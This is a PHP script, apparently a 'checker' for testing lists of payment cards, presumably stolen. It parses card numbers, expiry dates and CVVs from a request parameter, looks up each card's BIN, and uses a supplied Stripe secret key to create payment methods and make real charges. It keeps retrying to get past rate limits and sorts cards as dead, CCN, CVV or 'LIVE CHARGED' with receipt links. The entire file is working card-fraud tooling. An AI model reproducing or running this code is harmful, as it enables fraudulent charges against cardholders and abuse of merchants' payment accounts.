<?php
//===================== [ BROSS CHECKER ] ====================//
error_reporting(0);
set_time_limit(99999999);
date_default_timezone_set('America/Buenos_Aires');
require 'function.php';
//================ [ FUNCTIONS & LISTA ] ===============//
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
    $amt = '1';
    $chr = $amt * 100;
}
switch ($amt) {
  case '1':
  $amt = '100';
    break;
  case '0.5':
  $amt= '50';
  break;
    case '0.6':
  $amt= '60';
  break;
    case '0.7':
  $amt= '70';
  break;
    case '0.8':
  $amt= '80';
  break;
    case '0.9':
  $amt= '90';
  break;
  case '2':
  $amt = '200';
    break;
  case '3':
  $amt = '300';
    break;
  case '4':
  $amt = '400';
    break;
  case '5':
  $amt = '500';
    break;
  case '6':
  $amt = '600';
    break;
  case '7':
  $amt = '700';
    break;
  case '8':
  $amt = '800';
    break;
    case '9':
    $amt = '900';
    break;
    case '10':
    $amt = '1000';
    break;
}
if (strlen($amt) == 1) $amt = "$amt00";
if (strlen($amt) == 2) $amt = "$amt0";
$sk = $_GET['skgate'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
//////////////=======[bin data]=======/////////////////////////////
$bin = substr("$cc", 0, 6);
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//================= [ CURL REQUESTS ] =================//
$rate_limit_reached = false;
$loop_count = 0;
while (!$rate_limit_reached) {
$loop_count++;
  //================= [ CURL REQUESTS ] =================//
#-------------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
$result1 = curl_exec($ch);
$tok1 = Getstr($result1,'"id": "','"');
$msg1 = Getstr($result1,'"message": "','"');
$resp1 = Getstr($result1,'"code": "','"');
$para = Getstr($result1, ' "param": "','"');
////echo "<br><b>Result1: </b> $result1<br>";
  #-------------------[2nd REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amt.'&currency=eur&payment_method_types[]=card&payment_method='.$tok1.'&confirm=true&off_session=true');
$result2 = curl_exec($ch);
$riskl = Getstr($result2,'"risk_level": "','"');
$tok2 = Getstr($result2,'"id": "','"');
$msg2 = Getstr($result2,'"message": "','"');
$resp2 = Getstr($result2,'"code": "','"');
$cvc = Getstr($result2,'"cvc_check": "','"');
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
////echo "<br><b>Result2: </b> $result2<br>";
//=================== [ RESPONSES ] ===================//
//////////================[DEAD]==============///
if (strpos($result1, '"card_not_supported"') || strpos($result1, '"invalid_expiry_year"') || strpos($result1, '"invalid_cvc"') || strpos($result1, '"invalid_expiry_month"') || strpos($result1, '"incorrect_number"') || strpos($result1, '"generic_decline"') || strpos($result1, '"testmode_charges_only"') || strpos($result1, '"parameter_invalid_integer"') || strpos($result1, '"api_key_expired"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R1): '.$resp1.']['.$msg1.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($result2, '"fraudulent"') || strpos($result2, '"invalid_account"') || strpos($result2, '"pickup_card"') || strpos($result2, '"invalid_cvc"') || strpos($result2, '"incorrect_number"') || strpos($result2, '"lost_card"') || strpos($result2, '"generic_decline"') || strpos($result2, '"stolen_card"') || strpos($result2, '"card_not_supported"') || strpos($result2, '"card_decline_rate_limit_exceeded"')) {
    echo '<span style="color:red">========================================<br>DEAD:'.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
        $rate_limit_reached = true;
}
elseif (strpos($result1, '"rate_limit"') || strpos($result2, '"rate_limit"') || strpos($result2, '"processing_error"') ||strpos($result1, '"processing_error"') || (strpos($result2, '"try_again_later"'))) {
    $rate_limit_reached = false;
}
/////////////////=====[CCN]=====///////////////
elseif (strpos($result2,'"do_not_honor"') || strpos($result2,'"incorrect_cvc"')){
    echo '<span style="color:Aqua">========================================<br>CCN:'.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>{cvc_check:'.$cvc.'}<br>.['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br> ';
    $rate_limit_reached = true;
}
/////////////////=====[CVV]=====///////////////
elseif (strpos($result2,'"insufficient_funds"') || strpos($result2,'"authentication_required"') || strpos($result2,'"transaction_not_allowed"')){
    echo '<span style="color:#000099">========================================<br>CVV:'.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>{cvc_check:'.$cvc.'}<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br> ';
    $rate_limit_reached = true;
}
/////////////////=====[LIVE]=====///////////////
elseif (strpos($result2, '"status": "succeded"' )) {
    echo '<span style="color:#33cc33">========================================<br>LIVE CHARGED['.$amt.' USD ✅]['.$lista.']<br>[Receipt :<a href='.$receipturl.'>Here</a>]<br>{cvc_check:'.$cvc.'}<br>['.$type.']['.$country.']<br>[risk_level:'.$riskl.']<br>[BYPASSING: '.$loop_count.']</span><br>';
    $rate_limit_reached = true;
}
else{
    echo 'CVV:'.$lista.'<br> [Result1:'.$result1.']=====<br>===[Result2:'.$result2.']</span> <br>';
     break;
  }
  curl_close($ch);
  ob_flush();
}
//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";
?>